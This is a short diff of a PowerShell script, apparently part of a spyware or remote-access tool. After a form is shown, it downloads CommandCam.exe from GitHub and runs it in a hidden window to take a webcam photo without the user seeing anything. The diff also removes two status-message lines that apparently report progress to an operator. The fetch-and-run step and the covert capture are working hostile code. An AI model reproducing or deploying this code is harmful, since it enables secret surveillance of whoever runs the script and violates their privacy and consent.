@@ -501,13 +501,11 @@ $MainForm.add_Load($OnLoadForm_StateCorrection)
 #Show the Form 
 $MainForm.ShowDialog()| Out-Null 
 
-Send-Message "Downloading.."
 # https://batchloaf.wordpress.com/commandcam/
 $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
 $outpath = "C:\Users$env:username\Downloads\CommandCam.exe"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $url -OutFile $outpath
-Send-Message "Taking_picture.."
 $args = "/filename C:\Users$env:username\Downloads\image.jpg"
 Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
 } #End Function 
